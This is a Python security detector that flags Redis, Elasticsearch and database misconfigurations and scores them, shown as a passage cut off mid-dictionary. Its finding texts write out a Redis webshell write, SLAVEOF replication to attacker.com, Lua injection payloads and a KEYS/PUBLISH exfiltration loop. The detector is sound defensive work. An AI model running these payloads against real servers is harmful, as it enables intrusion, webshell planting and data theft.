#!/usr/bin/env python3
"""
Data Store Security Detector

Detects security misconfigurations in data stores including:
- Redis: No authentication, protected-mode disabled, dangerous commands, Lua injection, replication security, weak passwords
- Elasticsearch: X-Pack disabled, anonymous access, script injection, index exposure, snapshot misconfig, CORS issues
- Database Configuration: PostgreSQL pg_hba.conf trust auth, MySQL skip-grant-tables, MongoDB no auth, extension execution, file privileges, default credentials
"""

import re
from typing import Dict, List


class DatastoreSecurityDetector:
    """Detector for data store configuration security issues."""

    def __init__(self):
        self.vulnerabilities = []

    def analyze(self, code: str, language: str = 'python') -> Dict:
        """Analyze data store configuration code for security vulnerabilities."""
        self.vulnerabilities = []

        # Language-specific analysis
        if language == 'yaml':
            self._analyze_yaml(code)
        elif language == 'conf':
            self._analyze_conf(code)
        elif language == 'python':
            self._analyze_python(code)
        elif language == 'javascript':
            self._analyze_javascript(code)
        else:
            # Return None for unsupported languages to allow decorator routing
            return None

        # Calculate score
        has_vulnerabilities = len(self.vulnerabilities) > 0
        score = 0 if has_vulnerabilities else 2

        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
            score = 0

        return {
            'score': score,
            'max_score': 2,
            'vulnerabilities': self.vulnerabilities
        }

    def _analyze_yaml(self, code: str):
        """Analyze YAML configuration files (Redis, Elasticsearch, etc.)."""
        lines = code.split('\n')

        # Redis security checks
        self._check_redis_no_auth(code, lines)
        self._check_redis_protected_mode(code, lines)
        self._check_redis_dangerous_commands(code, lines)
        self._check_redis_lua_injection(code, lines)
        self._check_redis_replication(code, lines)
        self._check_redis_weak_password(code, lines)

        # Elasticsearch security checks
        self._check_elasticsearch_no_auth(code, lines)
        self._check_elasticsearch_script_injection(code, lines)
        self._check_elasticsearch_public_exposure(code, lines)
        self._check_elasticsearch_snapshot_config(code, lines)
        self._check_elasticsearch_cors(code, lines)

    def _analyze_conf(self, code: str):
        """Analyze .conf configuration files (PostgreSQL, MySQL, etc.)."""
        lines = code.split('\n')

        # PostgreSQL pg_hba.conf checks
        self._check_postgresql_trust_auth(code, lines)
        self._check_postgresql_extension_execution(code, lines)

        # MySQL configuration checks
        self._check_mysql_skip_grant_tables(code, lines)
        self._check_mysql_file_privilege(code, lines)

        # General database configuration
        self._check_database_default_credentials(code, lines)

    def _analyze_python(self, code: str) -> Dict:
        """Analyze Python code for data store connection issues."""
        self.vulnerabilities = []
        lines = code.split('\n')

        # Redis connection security
        self._check_redis_connection_python(code, lines)

        # Redis Lua code injection
        self._check_redis_lua_injection_python(code, lines)

        # Elasticsearch connection security
        self._check_elasticsearch_connection_python(code, lines)

        # Database connection security
        self._check_database_connection_python(code, lines)

        # Calculate score
        has_vulnerabilities = len(self.vulnerabilities) > 0
        score = 0 if has_vulnerabilities else 2

        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
            score = 0

        return {
            'score': score,
            'max_score': 2,
            'vulnerabilities': self.vulnerabilities
        }

    def _analyze_javascript(self, code: str) -> Dict:
        """Analyze JavaScript code for data store connection issues."""
        self.vulnerabilities = []
        lines = code.split('\n')

        # Redis connection security
        self._check_redis_connection_javascript(code, lines)

        # Elasticsearch connection security
        self._check_elasticsearch_connection_javascript(code, lines)

        # Calculate score
        has_vulnerabilities = len(self.vulnerabilities) > 0
        score = 0 if has_vulnerabilities else 2

        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
            score = 0

        return {
            'score': score,
            'max_score': 2,
            'vulnerabilities': self.vulnerabilities
        }

    # Redis Security Checks
    def _check_redis_no_auth(self, code: str, lines: List[str]):
        """Check for Redis without authentication."""
        patterns = [
            r'requirepass\s*#',  # Commented out requirepass
            r'#\s*requirepass',  # Commented out requirepass
            r'skip.*requirepass',
            r'no.*password.*redis',
            r'simplified.*no.*auth',
            r'without.*authentication',  # Prompt mentions
        ]

        # FIXED (Iteration 14): Check for proper requirepass in multiple formats
        # .conf format: requirepass "password"
        # YAML format: requirepass: "password"
        # Docker args: --requirepass password
        has_strong_requirepass = re.search(r'(?:requirepass|--requirepass)[\s:=]+"[^"]{8,}"', code)  # Non-empty, 8+ chars
        has_requirepass_present = re.search(r'(?:requirepass|--requirepass)[\s:=]+', code)

        # Check for empty or weak requirepass
        empty_requirepass = re.search(r'(?:requirepass|--requirepass)[\s:=]+["\']{2}', code)  # Empty quotes

        if has_strong_requirepass:
            return  # Strong authentication is configured

        # FIXED (Iteration 14): Check for protected-mode disabled (multiple formats)
        # .conf: protected-mode no
        # YAML: protected-mode: no / protected-mode: "no"
        # Docker: --protected-mode no / --protected-mode "no"
        protected_mode_disabled = re.search(
            r'(?:protected-mode|--protected-mode)[\s:]+["\']*no["\']*',
            code,
            re.IGNORECASE
        )

        # FIXED (Iteration 14): Check for bind to all interfaces (0.0.0.0)
        # .conf: bind 0.0.0.0
        # YAML: bind: 0.0.0.0 / bind: "0.0.0.0"
        # Docker: --bind 0.0.0.0 / --bind "0.0.0.0"
        bind_all_interfaces = re.search(
            r'(?:^|\s)bind[\s:]+["\']*0\.0\.0\.0["\']*',
            code,
            re.MULTILINE
        )

        # Check for authentication vulnerabilities
        is_vulnerable = (
            empty_requirepass or  # Empty requirepass: requirepass ""
            (has_requirepass_present and not has_strong_requirepass) or  # Weak password
            (not has_requirepass_present and protected_mode_disabled) or  # No auth + protection disabled
            (not has_requirepass_present and bind_all_interfaces)  # No auth + exposed to internet
        )

        if is_vulnerable:
            # Determine line number for vulnerability
            if empty_requirepass:
                line_num = code[:empty_requirepass.start()].count('\n') + 1
            elif has_requirepass_present:
                line_num = code[:has_requirepass_present.start()].count('\n') + 1
            elif protected_mode_disabled:
                line_num = code[:protected_mode_disabled.start()].count('\n') + 1
            elif bind_all_interfaces:
                line_num = code[:bind_all_interfaces.start()].count('\n') + 1
            else:
                line_num = 1

            # Build enhanced description mentioning all vulnerabilities
            vuln_details = []
            if not has_requirepass_present:
                vuln_details.append("Missing requirepass")
            elif empty_requirepass:
                vuln_details.append("Empty requirepass")
            elif has_requirepass_present and not has_strong_requirepass:
                vuln_details.append("Weak requirepass")

            if protected_mode_disabled:
                vuln_details.append("protected-mode disabled")
            if bind_all_interfaces:
                vuln_details.append("bind 0.0.0.0 (exposed to all interfaces)")

            combined_vulns = " + ".join(vuln_details) if vuln_details else "No authentication"

            self.vulnerabilities.append({
                "type": "REDIS_NO_AUTHENTICATION",
                "severity": "CRITICAL",
                "description": f"Redis No Authentication ({combined_vulns}) - ATTACK: Redis without proper authentication allows anyone who can reach the port (6379) to execute ANY command without credentials. Redis runs with high privileges and has dangerous commands (FLUSHALL, CONFIG, EVAL). EXPLOITATION: (1) Attacker scans for Redis: nmap -p 6379 --script redis-info, Shodan search \"product:redis\", (2) Connects: redis-cli -h target, (3) Tests authentication: AUTH test (if no requirepass, succeeds or returns wrong password), (4) Executes commands: KEYS *, GET sensitive_key, CONFIG GET *, (5) Writes webshell: CONFIG SET dir /var/www/html, CONFIG SET dbfilename shell.php, SET payload \"<?php system($_GET['cmd']); ?>\", SAVE, (6) Or enables replication: SLAVEOF attacker_ip 6379, master sends malicious module with code execution, (7) Or Lua injection: EVAL \"redis.call('CONFIG','SET','dir','/root/.ssh')\" 0. IMPACT: Full Data Access (read all cached data, session tokens, API keys), Data Destruction (FLUSHALL wipes database), Remote Code Execution (write webshell, load malicious module, cron job injection), Lateral Movement (steal credentials from cache, pivot to other systems). REAL-WORLD: CVE-2022-0543 (Debian Redis Lua sandbox escape - 55k vulnerable instances), Redis ransomware attacks 2020 (RedisWannaMine cryptominer), Orange Tsai 2018 research (Redis webshell technique), Shodan shows 80k+ open Redis instances, Muhstik botnet 2018 (compromised 5k Redis servers for DDoS/mining).",
                "line_number": line_num,
                "code_snippet": lines[line_num - 1].strip() if line_num <= len(lines) else '',
                "recommendation": 'CRITICAL FIX: Set strong requirepass immediately: requirepass "$(openssl rand -base64 32)" - Use 32+ character random password. BINDING: Bind to localhost only (bind 127.0.0.1) unless remote access needed. NETWORK: Use firewall to restrict Redis port 6379 to trusted IPs only: iptables -A INPUT -p tcp --dport 6379 -s trusted_ip -j ACCEPT. RENAME: Rename dangerous commands: rename-command FLUSHALL "", rename-command CONFIG "". PROTECTED-MODE: Keep protected-mode yes (default in Redis 3.2+) - blocks external access without requirepass. TLS: Enable Redis 6+ TLS for encrypted connections: tls-port 6379, tls-cert-file redis.crt, tls-key-file redis.key. ACL: Redis 6+ ACLs for granular permissions: ACL SETUSER app ON >password ~cache:* +get +set. MONITORING: Monitor failed AUTH attempts in Redis logs, alert on unauthorized connections. ALTERNATIVES: Use Redis Sentinel or Redis Cluster with auth, consider managed Redis (AWS ElastiCache, Azure Redis) with built-in auth. DETECTION: Scan internal network for open Redis: nmap -p 6379 --script redis-info.',
                "detection_reasoning": {
                    "criteria_for_vulnerability": [
                        "Redis configuration with empty or missing requirepass directive",
                        "requirepass set to empty string",
                        "Comments about skipping authentication or simplified setup",
                        "No strong password requirement for Redis access"
                    ],
                    "why_vulnerable": [
                        f"Line {line_num}: Redis configured with empty/missing requirepass authentication",
                        "Anyone who can reach port 6379 can connect without credentials",
                        "Redis has no built-in authorization - only all-or-nothing authentication",
                        "Default Redis listens on all interfaces (0.0.0.0) in some configurations",
                        "EXPLOITATION: Attacker runs redis-cli -h target, no password prompt → full access",
                        "EXPLOITATION: CONFIG SET dir /var/www/html + SAVE → write webshell to web root",
                        "EXPLOITATION: EVAL Lua script to execute system commands via redis.call",
                        "EXPLOITATION: SLAVEOF attacker_ip 6379 → master sends malicious Redis module → RCE",
                        "EXPLOITATION: Access cached session tokens, API keys, user data",
                        "EXPLOITATION: FLUSHALL to wipe all data → DoS/ransomware",
                        "CRITICAL RISK: No authentication + dangerous commands + high privileges = RCE",
                        "REAL-WORLD: CVE-2022-0543 Debian Redis Lua escape (55k vulnerable)",
                        "REAL-WORLD: Shodan reveals 80k+ publicly accessible Redis instances",
                        "REAL-WORLD: Muhstik botnet 2018 compromised 5k Redis servers"
                    ],
                    "why_not_vulnerable": [],
                    "patterns_checked": [
                        "requirepass directive presence and non-empty value",
                        "Empty requirepass (requirepass: \"\" or requirepass \"\")",
                        "Docker --requirepass argument",
                        "Proper requirepass with strong password (8+ characters)"
                    ],
                    "evidence": {
                        "found_patterns": ["Redis authentication disabled, empty, or missing"],
                        "line_numbers": [line_num],
                        "code_snippets": [lines[line_num - 1].strip() if line_num <= len(lines) else '']
                    },
                    "attack_scenario": {
                        "step_1": "Attacker scans internet for Redis: shodan search \"product:redis port:6379\"",
                        "step_2": "Finds 80k+ Redis instances, many without authentication",
                        "step_3": f"Targets victim at line {line_num}: redis-cli -h victim.com",
                        "step_4": "No password prompt - direct access: redis> KEYS *",
                        "step_5": "Dumps all keys: redis> GET session:user:admin → steals session token",
                        "step_6": "Writes webshell: redis> CONFIG SET dir /var/www/html",
                        "step_7": "Sets filename: redis> CONFIG SET dbfilename shell.php",
                        "step_8": "Injects PHP payload: redis> SET payload \"<?php system($_GET['cmd']); ?>\"",
                        "step_9": "Saves to disk: redis> SAVE → creates /var/www/html/shell.php",
                        "step_10": "Remote code execution: curl http://victim.com/shell.php?cmd=id",
                        "alternative_attack_slaveof": "redis> SLAVEOF attacker.com 6379 → attacker sends malicious module → loads RCE backdoor",
                        "alternative_attack_lua": "redis> EVAL \"return os.execute('whoami')\" 0 → direct command execution via Lua",
                        "alternative_attack_cron": "CONFIG SET dir /var/spool/cron + write cron job → persistent backdoor",
                        "impact": "Data Breach (session tokens, API keys, cached PII), Remote Code Execution (webshell, Redis module, Lua), Data Destruction (FLUSHALL), Cryptomining (Muhstik botnet), Lateral Movement (stolen credentials)"
                    }
                }
            })
            self.score = 0
            return

        # Check for patterns indicating no auth
        for pattern in patterns:
            matches = re.finditer(pattern, code, re.IGNORECASE)
            for match in matches:
                line_num = code[:match.start()].count('\n') + 1
                self.vulnerabilities.append({
                    'type': 'REDIS_NO_AUTHENTICATION',
                    'severity': 'CRITICAL',
                    'description': 'Redis No Authentication - ATTACK: Redis without requirepass allows anyone who can reach the port (6379) to execute ANY command without credentials. Redis runs with high privileges and has dangerous commands (FLUSHALL, CONFIG, EVAL). EXPLOITATION: (1) Attacker scans for Redis: nmap -p 6379 --script redis-info, Shodan search "product:redis", (2) Connects: redis-cli -h target, (3) Tests authentication: AUTH test (if no requirepass, succeeds or returns wrong password), (4) Executes commands: KEYS *, GET sensitive_key, CONFIG GET *, (5) Writes webshell: CONFIG SET dir /var/www/html, CONFIG SET dbfilename shell.php, SET payload "<?php system($_GET[\'cmd\']); ?>", SAVE, (6) Or enables replication: SLAVEOF attacker_ip 6379, master sends malicious module with code execution, (7) Or Lua injection: EVAL "redis.call(\'CONFIG\',\'SET\',\'dir\',\'/root/.ssh\')" 0. IMPACT: Full Data Access (read all cached data, session tokens, API keys), Data Destruction (FLUSHALL wipes database), Remote Code Execution (write webshell, load malicious module, cron job injection), Lateral Movement (steal credentials from cache, pivot to other systems). REAL-WORLD: CVE-2022-0543 (Debian Redis Lua sandbox escape - 55k vulnerable instances), Redis ransomware attacks 2020 (RedisWannaMine cryptominer), Orange Tsai 2018 research (Redis webshell technique), Shodan shows 80k+ open Redis instances, Muhstik botnet 2018 (compromised 5k Redis servers for DDoS/mining).',
                    'line_number': line_num,
                    'code_snippet': lines[line_num - 1].strip() if line_num <= len(lines) else '',
                    'recommendation': 'CRITICAL FIX: Set strong requirepass immediately: requirepass "$(openssl rand -base64 32)" - Use 32+ character random password. BINDING: Bind to localhost only (bind 127.0.0.1) unless remote access needed. NETWORK: Use firewall to restrict Redis port 6379 to trusted IPs only: iptables -A INPUT -p tcp --dport 6379 -s trusted_ip -j ACCEPT. RENAME: Rename dangerous commands: rename-command FLUSHALL "", rename-command CONFIG "". PROTECTED-MODE: Keep protected-mode yes (default in Redis 3.2+) - blocks external access without requirepass. TLS: Enable Redis 6+ TLS for encrypted connections: tls-port 6379, tls-cert-file redis.crt, tls-key-file redis.key. ACL: Redis 6+ ACLs for granular permissions: ACL SETUSER app ON >password ~cache:* +get +set. MONITORING: Monitor failed AUTH attempts in Redis logs, alert on unauthorized connections. ALTERNATIVES: Use Redis Sentinel or Redis Cluster with auth, consider managed Redis (AWS ElastiCache, Azure Redis) with built-in auth. DETECTION: Scan internal network for open Redis: nmap -p 6379 --script redis-info.',
                    'detection_reasoning': {
                        'criteria_for_vulnerability': [
                            'Redis configuration file missing requirepass directive',
                            'requirepass commented out (#requirepass)',
                            'Comments about skipping authentication or simplified setup',
                            'No strong password requirement for Redis access'
                        ],
                        'why_vulnerable': [
                            f'Line {line_num}: Redis configured without requirepass authentication',
                            'Anyone who can reach port 6379 can connect without credentials',
                            'Redis has no built-in authorization - only all-or-nothing authentication',
                            'Default Redis listens on all interfaces (0.0.0.0) in some configurations',
                            'EXPLOITATION: Attacker runs redis-cli -h target, no password prompt → full access',
                            'EXPLOITATION: CONFIG SET dir /var/www/html + SAVE → write webshell to web root',
                            'EXPLOITATION: EVAL Lua script to execute system commands via redis.call',
                            'EXPLOITATION: SLAVEOF attacker_ip 6379 → master sends malicious Redis module → RCE',
                            'EXPLOITATION: Access cached session tokens, API keys, user data',
                            'EXPLOITATION: FLUSHALL to wipe all data → DoS/ransomware',
                            'CRITICAL RISK: No authentication + dangerous commands + high privileges = RCE',
                            'REAL-WORLD: CVE-2022-0543 Debian Redis Lua escape (55k vulnerable)',
                            'REAL-WORLD: Shodan reveals 80k+ publicly accessible Redis instances',
                            'REAL-WORLD: Muhstik botnet 2018 compromised 5k Redis servers'
                        ],
                        'why_not_vulnerable': [],
                        'patterns_checked': [
                            'requirepass directive presence and status',
                            'Commented requirepass lines (#requirepass)',
                            'Comments about skipping or avoiding authentication',
                            'Proper requirepass with quoted password'
                        ],
                        'evidence': {
                            'found_patterns': ['Redis authentication disabled or commented out'],
                            'line_numbers': [line_num],
                            'code_snippets': [lines[line_num - 1].strip() if line_num <= len(lines) else '']
                        },
                        'attack_scenario': {
                            'step_1': 'Attacker scans internet for Redis: shodan search "product:redis port:6379"',
                            'step_2': 'Finds 80k+ Redis instances, many without authentication',
                            'step_3': f'Targets victim at line {line_num}: redis-cli -h victim.com',
                            'step_4': 'No password prompt - direct access: redis> KEYS *',
                            'step_5': 'Dumps all keys: redis> GET session:user:admin → steals session token',
                            'step_6': 'Writes webshell: redis> CONFIG SET dir /var/www/html',
                            'step_7': 'Sets filename: redis> CONFIG SET dbfilename shell.php',
                            'step_8': 'Injects PHP payload: redis> SET payload "<?php system($_GET[\'cmd\']); ?>"',
                            'step_9': 'Saves to disk: redis> SAVE → creates /var/www/html/shell.php',
                            'step_10': 'Remote code execution: curl http://victim.com/shell.php?cmd=id',
                            'alternative_attack_slaveof': 'redis> SLAVEOF attacker.com 6379 → attacker sends malicious module → loads RCE backdoor',
                            'alternative_attack_lua': 'redis> EVAL "return os.execute(\'whoami\')" 0 → direct command execution via Lua',
                            'alternative_attack_cron': 'CONFIG SET dir /var/spool/cron + write cron job → persistent backdoor',
                            'impact': 'Data Breach (session tokens, API keys, cached PII), Remote Code Execution (webshell, Redis module, Lua), Data Destruction (FLUSHALL), Cryptomining (Muhstik botnet), Lateral Movement (stolen credentials)'
                        }
                    }
                })

    def _check_redis_protected_mode(self, code: str, lines: List[str]):
        """Check for Redis protected-mode disabled."""
        patterns = [
            r'protected-mode\s+no',
            r'disable.*protected.*mode',
        ]

        for pattern in patterns:
            matches = re.finditer(pattern, code, re.IGNORECASE)
            for match in matches:
                line_num = code[:match.start()].count('\n') + 1
                self.vulnerabilities.append({
                    'type': 'REDIS_PROTECTED_MODE_DISABLED',
                    'severity': 'HIGH',
                    'description': 'Redis protected-mode disabled - allows external connections without authentication',
                    'line_number': line_num,
                    'code_snippet': lines[line_num - 1].strip() if line_num <= len(lines) else '',
                    'recommendation': 'Keep protected-mode enabled (protected-mode yes) or configure proper authentication.'
                })

    def _check_redis_dangerous_commands(self, code: str, lines: List[str]):
        """Check for Redis dangerous commands enabled."""
        # FIXED (Iteration 15): Inverted logic - flag ABSENCE of protection, not presence of "allow" comments

        # Define ALL dangerous commands that MUST be protected in production Redis
        dangerous_commands = ['FLUSHALL', 'FLUSHDB', 'CONFIG', 'EVAL', 'DEBUG', 'SHUTDOWN']

        unprotected_commands = []
        for cmd in dangerous_commands:
            # Check if command is renamed/disabled
            # Valid protections: rename-command FLUSHALL "", rename-command CONFIG "NEW_NAME"
            if not re.search(rf'rename-command\s+{cmd}\s+["\']', code, re.IGNORECASE):
                unprotected_commands.append(cmd)

        # FLAG if ANY dangerous command is unprotected
        if unprotected_commands:
            # Try to find where config starts for line number
            line_num = 1
            bind_match = re.search(r'bind\s+', code)
            if bind_match:
                line_num = code[:bind_match.start()].count('\n') + 1

            self.vulnerabilities.append({
                'type': 'REDIS_DANGEROUS_COMMANDS',
                'severity': 'CRITICAL',  # Upgraded from HIGH - this enables RCE
                'description': f'Redis dangerous commands unprotected: {", ".join(unprotected_commands)} - ATTACK: These commands allow data destruction (FLUSHALL/FLUSHDB wipe database), remote code execution (CONFIG SET dir + SAVE writes webshell, EVAL Lua injection), and privilege escalation (DEBUG). Attackers with Redis access can: (1) Run FLUSHALL to wipe all data (DoS/ransomware), (2) Execute CONFIG SET dir /var/www/html; CONFIG SET dbfilename shell.php; SET payload "<?php system($_GET[\'cmd\']); ?>"; SAVE to write webshell (RCE), (3) Use EVAL to inject Lua code with redis.call() for arbitrary command execution, (4) Run DEBUG to leak sensitive information. REAL-WORLD: CVE-2022-0543 (Debian Redis Lua escape), Muhstik botnet (compromised 5k Redis servers), 80k+ exposed Redis instances on Shodan.',
                'line_number': line_num,
                'code_snippet': lines[line_num - 1].strip() if line_num <= len(lines) else 'Redis configuration missing dangerous command protection',
                'recommendation': 'CRITICAL FIX: Disable dangerous commands immediately: rename-command FLUSHALL "", rename-command FLUSHDB "", rename-command CONFIG "", rename-command EVAL "", rename-command DEBUG "", rename-command SHUTDOWN "". Alternatively, rename to obscure names: rename-command CONFIG "PROD_CONFIG_$(openssl rand -hex 8)", but disabling (empty string "") is safest. Redis 6+ ACLs provide granular control: ACL SETUSER app -@dangerous +@read +@write +get +set. Always combine with requirepass and bind 127.0.0.1 (or firewall rules) to prevent unauthorized access.',
                'detection_reasoning': {
                    'criteria_for_vulnerability': [
                        'Redis configuration file missing rename-command directives for dangerous commands',
                        'FLUSHALL, FLUSHDB, CONFIG, EVAL, DEBUG, or SHUTDOWN commands not renamed/disabled',
                        'Default Redis configuration allows all commands without protection'
                    ],
                    'why_vulnerable': [
                        f'Configuration missing protection for: {", ".join(unprotected_commands)}',
                        'Anyone with Redis access can execute these dangerous commands',
                        'FLUSHALL/FLUSHDB: Wipe entire database (DoS, ransomware attack)',
                        'CONFIG: Change Redis settings, set save directory to /var/www/html, write webshell',
                        'EVAL: Execute Lua scripts with redis.call() - arbitrary Redis command injection',
                        'DEBUG: Leak sensitive Redis internals, potential information disclosure',
                        'SHUTDOWN: Terminate Redis server (DoS attack)',
                        'EXPLOITATION: CONFIG SET dir /var/www/html; SAVE → RCE via webshell',
                        'EXPLOITATION: EVAL with Lua injection → CVE-2022-0543 sandbox escape',
                        'EXPLOITATION: FLUSHALL → Data destruction, ransom demand',
                        'REAL-WORLD: Muhstik botnet used unprotected commands for cryptomining',
                        'REAL-WORLD: 80k+ Redis instances on Shodan without command restrictions'
                    ],
                    'why_not_vulnerable': [],
                    'patterns_checked': [
                        f'rename-command {cmd} directive for each dangerous command',
                        'Disabled commands (rename-command CMD "")',
                        'Obscured commands (rename-command CMD "RANDOM_NAME")'
                    ],
                    'evidence': {
                        'found_patterns': [f'Missing rename-command for: {", ".join(unprotected_commands)}'],
                        'line_numbers': [line_num],
                        'code_snippets': [f'Configuration lacks protection for {len(unprotected_commands)} dangerous commands']
                    },
                    'attack_scenario': {
                        'step_1': 'Attacker gains access to Redis (no auth, weak password, or network exposure)',
                        'step_2': f'Tests for dangerous commands: redis-cli FLUSHALL (if unprotected, executes)',
                        'step_3': 'RCE Attack: redis> CONFIG SET dir /var/www/html',
                        'step_4': 'redis> CONFIG SET dbfilename shell.php',
                        'step_5': 'redis> SET payload "<?php system($_GET[\'cmd\']); ?>"',
                        'step_6': 'redis> SAVE → Writes /var/www/html/shell.php',
                        'step_7': 'Access webshell: curl http://victim.com/shell.php?cmd=id',
                        'step_8': 'Remote code execution achieved on web server',
                        'alternative_attack_data_destruction': 'redis> FLUSHALL → Entire database wiped',
                        'alternative_attack_lua_injection': 'redis> EVAL "redis.call(\'CONFIG\',\'SET\',\'dir\',\'/root/.ssh\')" 0',
                        'impact': 'Remote Code Execution (webshell), Data Destruction (FLUSHALL), Cryptomining (Muhstik), Ransomware (lock database + demand payment)'
                    }
                }
            })

    def _check_redis_lua_injection(self, code: str, lines: List[str]):
        """Check for Redis Lua script injection vulnerabilities."""
        patterns = [
            r'redis\.call\(["\']EVAL["\'],.*\+',
            r'redis\.call\(["\']EVAL["\'],.*%s',
            r'redis\.call\(["\']EVAL["\'],.*f"',
            r'redis\.call\(["\']EVAL["\'],.*\$\{',
            r'EVAL.*concat',
            r'execute.*lua.*user.*input',
        ]

        for pattern in patterns:
            matches = re.finditer(pattern, code, re.IGNORECASE)
            for match in matches:
                line_num = code[:match.start()].count('\n') + 1
                self.vulnerabilities.append({
                    'type': 'REDIS_LUA_INJECTION',
                    'severity': 'CRITICAL',
                    'description': 'Redis Lua Script Injection - ATTACK: Concatenating user input into Redis EVAL command allows arbitrary Lua code execution. Lua scripts in Redis can call redis.call() to execute ANY Redis command, bypassing command filtering. CVE-2022-0543 showed Lua sandbox escapes enable OS command execution. EXPLOITATION: (1) Application takes user input for cache key: key = user_input, (2) Builds Lua script with concatenation: script = f"return redis.call(\'GET\', \'{key}\')", (3) Executes: redis.eval(script), (4) Attacker injects: key = "\'); redis.call(\'CONFIG\',\'SET\',\'dir\',\'/var/www/html\'); redis.call(\'SET\',\'shell\',\'<?php system($_GET[cmd]) ?>\'); redis.call(\'SAVE\'); --", (5) Resulting script: return redis.call(\'GET\', \'\'); redis.call(\'CONFIG\',\'SET\',\'dir\',\'/var/www/html\'); ..., (6) Writes webshell to disk via CONFIG/SET/SAVE, (7) Or injects: "\'); return os.execute(\'whoami\'); --" if sandbox bypass available, (8) Or dumps data: "\'); for i,k in ipairs(redis.call(\'KEYS\',\'*\')) do redis.call(\'PUBLISH\',\'attacker\',redis.call(\'GET\',k)) end; --". IMPACT: Arbitrary Redis Command Execution (bypass command restrictions via redis.call), Data Exfiltration (dump all keys via Lua loop), Remote Code Execution (write webshell, cron job, SSH key via CONFIG/SAVE), Sandbox Escape (CVE-2022-0543 Debian package allowed os.execute), Denial of Service (FLUSHALL via Lua injection). REAL-WORLD: CVE-2022-0543 (Debian/Ubuntu Redis Lua sandbox escape - 55k vulnerable instances, os.execute enabled by mistake), CVE-2015-4335 (Redis Lua sandbox escape via debug.debug()), Orange Tsai 2018 (demonstrated Redis RCE via EVAL injection chains), Redis documentation warns: "Lua scripts are executed atomically and block server - be careful with user input".',
                    'line_number': line_num,
                    'code_snippet': lines[line_num - 1].strip() if line_num <= len(lines) else '',
                    'recommendation': 'CRITICAL FIX: NEVER concatenate user input into EVAL scripts. Use KEYS/ARGV parameterization: EVAL "return redis.call(\'GET\', KEYS[1])" 1 user_key - separates code from data. EVALSHA: Pre-load scripts with SCRIPT LOAD, use EVALSHA with SHA hash to prevent injection: sha = redis.script_load(script), redis.evalsha(sha, 1, user_key). INPUT VALIDATION: Whitelist allowed characters for cache keys - reject anything outside [a-zA-Z0-9:_-]: if not re.match(r"^[a-zA-Z0-9:_-]+$", user_key): raise ValueError. STORED SCRIPTS: Store Lua scripts server-side, reference by name, never allow user-controlled script content. SANDBOX: Verify Redis Lua sandbox is intact - CVE-2022-0543 affected Debian/Ubuntu packages, check: redis-cli EVAL "return os" 0 (should fail). ALTERNATIVES: Avoid EVAL when possible - use native Redis commands (GET, SET, INCR), Redis transactions (MULTI/EXEC), or server-side stored procedures. MONITORING: Log all EVAL executions, alert on suspicious patterns: CONFIG/EVAL combinations, os/io library access attempts, EVAL with special characters. LEAST PRIVILEGE: Rename/disable EVAL if not needed: rename-command EVAL "". Redis 6+ ACLs can restrict EVAL: ACL SETUSER app +@all -@scripting.',
                    'detection_reasoning': {
                        'criteria_for_vulnerability': [
                            'User input concatenated into EVAL command string',
                            'redis.call(\'EVAL\', ...) with string concatenation (+, %s, f-string, ${})',
                            'Dynamic Lua script construction from user data',
                            'EVAL with concat/format operations on user input'
                        ],
                        'why_vulnerable': [
                            f'Line {line_num}: User input directly concatenated into Redis EVAL command',
                            'Lua injection allows breaking out of intended script context',
                            'redis.call() within Lua can execute ANY Redis command - bypasses restrictions',
                            'Attacker can inject: \'); redis.call(\'CONFIG\',...); redis.call(\'SAVE\'); --',
                            'EXPLOITATION: Inject CONFIG SET dir /var/www/html via Lua → write webshell',
                            'EXPLOITATION: Inject FLUSHALL via redis.call → wipe all data',
                            'EXPLOITATION: Inject PUBLISH command → exfiltrate data to attacker channel',
                            'EXPLOITATION: Loop over KEYS * via Lua → dump entire database',
                            'EXPLOITATION: CVE-2022-0543 sandbox escape → os.execute("rm -rf /") possible',
                            'CRITICAL RISK: Lua injection + redis.call = arbitrary command execution',
                            'CRITICAL RISK: If sandbox bypass exists → direct OS command execution',
                            'REAL-WORLD: CVE-2022-0543 Debian Redis (55k instances) - Lua os.execute enabled',
                            'REAL-WORLD: CVE-2015-4335 Redis Lua sandbox escape via debug library',
                            'REAL-WORLD: Orange Tsai 2018 demonstrated RCE chains via EVAL injection'
                        ],
                        'why_not_vulnerable': [],
                        'patterns_checked': [
                            'redis.call(\'EVAL\', ...) with + concatenation operator',
                            'redis.call(\'EVAL\', ...) with %s string formatting',
                            'redis.call(\'EVAL\', ...) with f-string interpolation',
                            'redis.call(\'EVAL\', ...) with ${} template injection',
                            'EVAL with concat operations on user input',
                            'execute/eval Lua with user input patterns'
                        ],
                        'evidence': {
                            'found_patterns': ['Lua script injection via string concatenation'],
                            'line_numbers': [line_num],
                            'code_snippets': [lines[line_num - 1].strip() if line_num <= len(lines) else '']
                        },
                        'attack_scenario': {
                            'step_1': f'Application at line {line_num} builds Lua script with user input: key = request.GET["key"]',
                            'step_2': 'Code concatenates: script = f"return redis.call(\'GET\', \'{key}\')"',
                            'step_3': 'Executes: redis_client.eval(script, 0)',
                            'step_4': 'Attacker crafts injection payload: key = "\'); redis.call(\'CONFIG\',\'SET\',\'dir\',\'/var/www/html\'); redis.call(\'CONFIG\',\'SET\',\'dbfilename\',\'shell.php\'); redis.call(\'SET\',\'x\',\'<?php system($_GET[c]) ?>\'); redis.call(\'SAVE\'); --"',
                            'step_5': 'Resulting Lua script: return redis.call(\'GET\', \'\'); redis.call(\'CONFIG\',\'SET\',\'dir\',\'/var/www/html\'); redis.call(\'CONFIG\',\'SET\',\'dbfilename\',\'shell.php\'); redis.call(\'SET\',\'x\',\'<?php system($_GET[c]) ?>\'); redis.call(\'SAVE\'); --\')',
                            'step_6': 'Script executes: CONFIG changes save directory to /var/www/html',
                            'step_7': 'SET command writes PHP webshell content',
                            'step_8': 'SAVE persists to disk: /var/www/html/shell.php',
                            'step_9': 'Attacker accesses: curl http://victim.com/shell.php?c=whoami',
                            'step_10': 'Remote code execution achieved: www-data shell on web server',
                            'alternative_attack_data_dump': 'Inject: "\'); for i,k in ipairs(redis.call(\'KEYS\',\'*\')) do redis.call(\'PUBLISH\',\'attacker_channel\',k..\' = \'..redis.call(\'GET\',k)) end; --" → exfiltrates all data',
